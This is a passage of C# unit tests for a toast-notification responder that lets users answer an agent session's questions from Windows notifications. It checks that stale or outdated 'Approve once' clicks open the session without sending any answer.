        var (a, _) = option.Answer(new Dictionary<string, string>(), "r1");
        Assert.Equal("pg", a!.Fields!["answer"].GetString());
        Assert.Null(Answers.Check(Make.Choice(), a));

        var other = ToastAction.Parse(ToastXml.Args(("action", "answer"), ("session", "s1"), ("question", "q1"), ("kind", "other"), ("field", "answer")));
        Assert.Equal("""{"other":"DuckDB ✓"}""", other.Answer(new Dictionary<string, string> { ["other"] = "DuckDB ✓" }, "r").Answer!.Fields!["answer"].GetRawText());
        Assert.Equal("type your own answer first", other.Answer(new Dictionary<string, string> { ["other"] = "  " }, "r").Problem);

        var text = ToastAction.Parse(ToastXml.Args(("action", "answer"), ("session", "s1"), ("question", "t1"), ("kind", "text")));
        Assert.Equal("next", text.Answer(new Dictionary<string, string> { ["text"] = "next" }, "r").Answer!.Text);

        Assert.Equal(("open", "s9"), (ToastAction.Parse("action=open&session=s9").Action, ToastAction.Parse("action=open&session=s9").Session));
    }

    [Fact]
    [Trait("Category", "Network")]
    public async Task Answering_on_a_toast_sends_through_the_host_and_replaces_the_toast_with_the_outcome()
    {
        await using var host = new FakeHost();
        host.On(Ops.SessionAnswer, _ => new AnswerResult(AnswerOutcome.Stale));
        host.Start();
        await using var connection = host.Connect();
        var deliveries = new Deliveries(connection, new LockedDispatcher()) { RetryDelay = TimeSpan.FromMilliseconds(50) };
        string? opened = null;
        var responder = new ToastResponder(deliveries, sink, s => opened = s);
        var pg = Xml(new ToastNotice("t", ToastXml.Question(Make.Session(question: Make.Choice("q1")), Caps, null), false))
            .Descendants("action").Select(a => (string)a.Attribute("arguments")!).First(a => ToastAction.Parse(a).Value == "pg");

        await responder.HandleAsync(pg, new Dictionary<string, string>());

        var outcome = Assert.Single(sink.Shown);
        Assert.Equal("s1~a", outcome.Tag);
        Assert.Contains("Already answered or gone: the session is no longer asking this.", Xml(outcome).Descendants("text").Select(t => t.Value));
        Assert.Equal("pg", host.Sent(Ops.SessionAnswer).Single().GetProperty("fields").GetProperty("answer").GetString());

        await responder.HandleAsync("action=open&session=s7", new Dictionary<string, string>());
        Assert.Equal("s7", opened);
    }

    // What an Approve once button said before #372, still in Notification Center after an update.
    static string OldApproveOnce(string? machine = null)
    {
        var args = ToastXml.Args(("action", "answer"), ("session", "s1"), ("question", "r1#d"), ("kind", "option"), ("field", "decision"), ("value", "approve"));
        return machine is null ? args : $"{args}&{ToastXml.Args(("machine", machine))}";
    }

    [Fact]
    public async Task An_approve_once_click_on_an_older_toast_opens_the_question_and_answers_nothing()
    {
        await using var host = new FakeHost();
        host.On(Ops.SessionAnswer, _ => new AnswerResult(AnswerOutcome.Delivered));
        host.Start();
        await using var connection = host.Connect();
        var deliveries = new Deliveries(connection, new LockedDispatcher()) { RetryDelay = TimeSpan.FromMilliseconds(50) };
        var opened = new List<(string?, string?)>();
        var responder = new ToastResponder(_ => deliveries, sink, (machine, s) => opened.Add((machine, s))) { OutcomeWait = TimeSpan.FromSeconds(2) };

        await responder.HandleAsync(OldApproveOnce(), new Dictionary<string, string>());
        await responder.HandleAsync(OldApproveOnce("remote-id"), new Dictionary<string, string>());

        Assert.Equal([(null, "s1"), ("remote-id", "s1")], opened);
        Assert.Empty(host.Sent(Ops.SessionAnswer));
        Assert.Empty(sink.Shown);
    }

    [Fact]
    public async Task A_click_on_a_session_the_app_knows_is_asking_for_approval_opens_it_and_answers_nothing_whatever_question_it_names()
    {
        await using var host = new FakeHost();
        host.On(Ops.SessionAnswer, _ => new AnswerResult(AnswerOutcome.Delivered));
        host.Start();
        await using var connection = host.Connect();
        var deliveries = new Deliveries(connection, new LockedDispatcher()) { RetryDelay = TimeSpan.FromMilliseconds(50) };
        var opened = new List<string?>();
        var responder = new ToastResponder(deliveries, sink, opened.Add)
        {
            OutcomeWait = TimeSpan.FromSeconds(2),
            SessionOf = (_, id) => Make.Session(id, SessionStatus.Waiting, Make.Approval()),
        };
        var mark = ToastXml.Args((ToastXml.AnswerVersionKey, ToastXml.AnswerVersion));

        await responder.HandleAsync($"{OldApproveOnce()}&{mark}", new Dictionary<string, string>());
        // A button for an earlier question, a choice, while the session now asks for approval.
        await responder.HandleAsync($"{ToastXml.Args(("action", "answer"), ("session", "s1"), ("question", "q1"), ("kind", "option"), ("field", "answer"), ("value", "pg"))}&{mark}", new Dictionary<string, string>());

        Assert.Equal(["s1", "s1"], opened);
        Assert.Empty(host.Sent(Ops.SessionAnswer));
        Assert.Empty(sink.Shown);
    }
}

static class PlannerExtensions
{
    // A question seen and left pending past its delay.
    public static void Tap(this ToastPlanner p, FakeTimeProvider clock, Session s)
    {
        p.Upsert(s);
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
    }
}
